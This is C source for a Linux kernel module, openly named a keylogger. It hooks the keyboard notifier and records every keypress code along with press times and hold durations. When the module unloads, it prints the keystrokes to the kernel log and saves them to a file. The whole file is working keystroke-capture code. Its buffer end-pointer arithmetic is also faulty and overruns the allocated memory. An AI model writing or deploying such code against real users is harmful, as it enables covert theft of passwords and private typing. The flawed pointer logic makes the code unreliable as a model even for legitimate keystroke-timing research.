#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#include "keylogger.h"

int flag;

int * buffer;
int * buffer_ptr;
int * buffer_endptr;
long buf_length;

unsigned int * deltas;
unsigned int * deltas_ptr;
unsigned int * deltas_endptr;
long deltas_length;

struct timespec * times;
struct timespec * times_ptr;
struct timespec * times_endptr;
long long times_length;

struct file * fp;
struct timespec ts_up;
struct timespec ts_down;
mm_segment_t fs;
loff_t pos;


static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};


int keylogger_init(void) {
    buf_length = LOG_MAX_SIZE * sizeof(int);
    buffer = kmalloc(buf_length, GFP_KERNEL);
    buffer_ptr = buffer;
    buffer_endptr = buffer + buf_length;

    deltas_length = LOG_MAX_SIZE * sizeof(unsigned int);
    deltas = kmalloc(deltas_length, GFP_KERNEL);
    deltas_ptr = deltas;
    deltas_endptr = deltas + deltas_length;

	times_length = LOG_MAX_SIZE * sizeof(struct timespec);
	times = kmalloc(times_length, GFP_KERNEL);
	times_ptr = times;
	times_endptr = times + times_length;
    
    register_keyboard_notifier(&nb);
    memset(buffer, 0, buf_length);
	memset(deltas, 0, deltas_length);
	memset(times, 0, times_length);

	printk(KERN_ERR  "KEYLOGGER init");
    
    return 0;
}

void keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    save_buffer();

    memset(buffer, 0, buf_length);
	memset(deltas, 0, deltas_length);
	memset(times, 0, times_length);
    kfree(buffer);
	kfree(deltas);
	kfree(times);
    buffer_ptr = buffer;
	deltas_ptr = deltas;
	times_ptr = times;

    flag = 0;

	printk(KERN_ERR  "KEYLOGGER exit");
}

int save_buffer()
{
	int i;
	int s = buffer_ptr - buffer;
	printk(KERN_ERR  "KEYLOGGER %i", s);

	
	for(i = 0; i < s; i++){
		int key  =  buffer[i];
		printk(KERN_ERR  "KEYLOGGER %i down  %s at %.2lu:%.6lu with delta %u", key, keymap[key],
																times[i].tv_sec % 60,
																times[i].tv_nsec / 1000,
																deltas[i]);
	}

    fp = filp_open(LOG_FILE_PATH, O_RDWR | O_CREAT, 0600);
    if (IS_ERR(fp)) {
        return -1;
    }
    pos = 0;
    fs = get_fs();
    set_fs(KERNEL_DS);
	vfs_write(fp, (const char*)&s, sizeof(int), &pos);
    vfs_write(fp, (const char *)buffer, (buffer_ptr-buffer)*sizeof(int), &pos);
	vfs_write(fp, (const char *)times, (times_ptr-times)*sizeof(struct timespec), &pos);
	vfs_write(fp, (const char *)deltas, (deltas_ptr-deltas)*sizeof(unsigned int), &pos);
    vfs_fsync(fp, 0);
    filp_close(fp, NULL);
    set_fs(fs);
    return 0;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param *param = _param;  

    if(flag)
        return NOTIFY_OK;

    if(code == KBD_KEYCODE && param->down) {

	//const char *key_char = !shift_pressed ? keymap[param->value] : keymap_shift[param->value];
    	int key = param->value;

		getnstimeofday(&ts_down);
		*times_ptr = ts_down;
		times_ptr++;

        *buffer_ptr = key;
        buffer_ptr++;

        if(buffer_ptr == buffer_endptr)
            flag = 1;
	
	//printk(KERN_ERR  "KEYLOGGER %i down  %s", param->value, key_char);
    }else if(code == KBD_KEYCODE && !param->down) {
    	unsigned int d; //milliseconds

		getnstimeofday(&ts_up);
	
		if(ts_up.tv_sec == ts_down.tv_sec) {
			d = (ts_up.tv_nsec - ts_down.tv_nsec)/1000000;
		}else{
			d = 60000 - (ts_down.tv_nsec + ts_up.tv_nsec)/1000000;
		}

		*deltas_ptr = d;
		deltas_ptr++;

		//printk(KERN_ERR  "KEYLOGGER delta %u", d);	
    }
    return NOTIFY_OK;
}

MODULE_LICENSE("GPL");
module_init(keylogger_init);
module_exit(keylogger_exit);
